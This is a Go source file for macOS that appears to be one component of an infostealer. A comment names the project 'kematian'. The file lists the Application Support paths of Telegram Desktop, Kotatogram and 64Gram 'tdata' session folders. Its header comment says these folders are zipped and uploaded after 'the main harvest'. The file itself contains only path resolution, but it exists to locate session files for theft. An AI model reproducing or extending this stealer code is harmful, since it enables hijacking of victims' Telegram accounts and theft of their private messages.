//go:build darwin

// telegram_darwin.go — macOS paths for Telegram Desktop–compatible tdata folders.
//
// tdata holds local session material; cmd/kematian zips each found directory
// and uploads it as a separate archive after the main harvest.
package scanner

import (
	"os"
	"path/filepath"
)

// getTelegramPaths lists known Telegram forks under Application Support.
func getTelegramPaths() []telegramPathConfig {
	return []telegramPathConfig{
		{"Telegram Desktop", "Telegram Desktop/tdata", "appdata"},
		{"Kotatogram", "Kotatogram Desktop/tdata", "appdata"},
		{"64Gram", "64Gram Desktop/tdata", "appdata"},
	}
}

// resolveTelegramBase maps portable base names (appdata/home) to macOS locations.
func resolveTelegramBase(base string) string {
	home, _ := os.UserHomeDir()
	switch base {
	case "home", "userprofile":
		return home
	case "appdata":
		return filepath.Join(home, "Library", "Application Support")
	case "localappdata":
		return filepath.Join(home, "Library", "Application Support")
	}
	return ""
}